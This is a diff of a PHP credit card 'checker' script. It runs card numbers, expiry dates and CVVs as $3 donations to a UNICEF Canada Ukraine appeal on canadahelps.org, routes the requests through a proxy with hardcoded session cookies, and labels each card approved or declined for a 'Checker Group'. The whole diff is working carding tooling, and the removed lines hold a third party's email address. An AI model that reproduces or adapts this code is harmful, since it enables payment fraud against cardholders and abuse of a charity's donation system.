@@ -96,8 +96,6 @@ else{
 $zip = "90201";
 $city = "Bell";
 };
-
-
 # -------------------- [1 REQ] -------------------#
 
 $ch = curl_init();
@@ -110,9 +108,9 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'method: POST',
 'path: /tokens/v2',
 'scheme: https',
-'accept: */*',
-'accept-language: en-US,en;q=0.9,bn;q=0.8',
-'content-type: application/json',
+'accept: application/json',
+'accept-language: en-US,en;q=0.9',
+'content-type: application/json; charset=utf-8',
 'origin: https://www.canadahelps.org',
 'referer: https://www.canadahelps.org/',
 'sec-fetch-dest: empty',
@@ -129,7 +127,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [1req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, '{"BillingAddress":{"Line1":"'.$street.'","Line2":"","City":"'.$city.'","Province":"'.$state.'","Country":"US","postalCode":"'.$zip.'"},"CreditCardNumber":"'.$cc.'","ExpiryDate":"'.$mes.'+'.$ano.'","CVN":"'.$cvv.'","PostalCode":"'.$zip.'","CardHolderName":"'.$name.'+'.$last.'"}');
+curl_setopt($ch, CURLOPT_POSTFIELDS, '{"BillingAddress":null,"CreditCardNumber":"'.$cc.'","ExpiryDate":"'.$mes.''.$ano.'","CVN":"'.$cvv.'","PostalCode":"'.$zip.'","CardHolderName":"'.$name.' '.$last.'"}');
 
 
 
@@ -140,7 +138,7 @@ $id = trim(strip_tags(getStr($result1,'"id": "','"')));
 
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
-curl_setopt($ch, CURLOPT_URL, 'https://www.canadahelps.org/site/api/CDF/fullform/donate');
+curl_setopt($ch, CURLOPT_URL, 'https://www.canadahelps.org/site/api/GivingBasket');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
@@ -153,14 +151,14 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
     curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'authority: www.canadahelps.org',
 'method: POST',
-'path: /site/api/CDF/fullform/donate',
+'path: /site/api/GivingBasket',
 'scheme: https',
-'accept: */*',
-'accept-language: en-US,en;q=0.9',
-'content-type: application/json',
-'cookie: ',
+'accept: application/json',
+'accept-language: en-CA, en-GB;q=0.9, en;q=0.8',
+'content-type: application/json; charset=utf-8',
+'cookie: ASP.NET_SessionId=nb324giek0sjakxhxtwvot2a; PHPSESSID=4mhbrktllh4bq9r1ip2cc1ipof; charity_profile_interest=; _icl_visitor_lang_js=en_us; _ga=GA1.2.1593894478.1648059242; _gid=GA1.2.54249206.1648059242; _fbp=fb.1.1648059242554.1849017455; outbrain_cid_fetch=true; _clck=8kost2|1|f00|0; _hjFirstSeen=1; _hjSession_1676598=eyJpZCI6IjcxZmQ1MDc2LWQzZDYtNDAyYS04ZjkxLTZjYmNlMTlhMmJlZiIsImNyZWF0ZWQiOjE2NDgwNTkyNDM5NjMsImluU2FtcGxlIjp0cnVlfQ==; _hjAbsoluteSessionInProgress=0; _hjSessionUser_1676598=eyJpZCI6ImYxYWY1NTA0LTk1NDItNTUyNi1hZmFhLWVmZjk0NTczOGU0YyIsImNyZWF0ZWQiOjE2NDgwNTkyNDI3MjMsImV4aXN0aW5nIjp0cnVlfQ==; __atuvc=4|12; __atuvs=623b636675b32c92003; wpml_browser_redirect_test=0; _uetsid=04a09350aad511ec89296d49af149999; _uetvid=04a1b520aad511ecb26fc39e7d4376f0; _clsk=1x2tmg|1648059318420|8|1|h.clarity.ms/collect',
 'origin: https://www.canadahelps.org',
-'referer: https://www.canadahelps.org/en/dne/3148',
+'referer: https://www.canadahelps.org/en/givingbasket/',
 'sec-fetch-dest: empty',
 'sec-fetch-mode: cors',
 'sec-fetch-site: same-origin',
@@ -169,8 +167,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [2req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS,'{"pageId":3148,"paymentMethod":{"paymentType":1,"token":"'.$token.'"},"amountType":0,"anonymityID":0,"scheduledGivingStartDate":"2022-03-23","amount":3,"messageToCharity":"","suggestedAskAmount":3,"fundID":"37110","donorInfo":{"firstName":"'.$name.'","lastName":"'.$last.'
-","emailAddress":"kjohnston46@yahoo.com","companyName":"","addressInfo":{"addressLine1":"'.$street.'","addressLine2":"","city":"'.$city.'","country":"US","postalCode":"'.$zip.'","province":"'.$state.'","id":-1},"donorType":"PERSONAL"},"dedication":null,"eCard":null,"postCard":null,"languagePreference":1,"feeInfo":{"IsAmountTheNet":false,"OfferedFee":null},"isEmbedded":true,"isMobile":false,"metaData":{"QuestionOne":"","AnswerOne":"","PhoneNumber":"","AddToMailingList":false}}');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'{"createAccount":null,"donorInfo":{"firstName":"'.$name.'","lastName":"'.$last.'","emailAddress":"'.$email.'","addressInfo":{"addressLine1":"'.$street.'","city":"'.$city.'","country":"US","postalCode":"'.$zip.'","province":"NY","provinceOther":"'.$state.'"},"donorType":"PERSONAL","receiptAggregationCode":1,"anonymityPreference":0},"orders":{"orderLineItems":[{"id":"'.$id.'","type":32,"amount":3,"fundID":266406,"fund_description":"Ukraine Emergency Fund","fund_description_fr":"Ukraine Emergency Fund","charityID":37110,"charityName":"UNICEF CANADA","charitySlug":"canadian-unicef-committee","campaignSlug":"20787","isCHDonation":false,"donationSourceID":20787,"detailType":0,"giftCard":null,"dedication":null,"ecard":null,"scheduleDetails":null,"messageToCharity":null,"givingPageDonation":null}],"total":3,"ordersLoaded":true,"error":"","unSavedItems":[],"expiredItems":[],"showErrorOnUnSavedData":false},"anonymityPreference":0,"languageID":1,"paymentInfo":[{"paymentType":1,"token":"'.$token.'"}]}');
 
 
 $result2 = curl_exec($ch);
@@ -356,7 +353,7 @@ elseif
 }
 
 elseif
-(strpos($result2,  "A generic error has occured")) {
+(strpos($result2,  "generic_decline")) {
   echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Generic_Decline [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
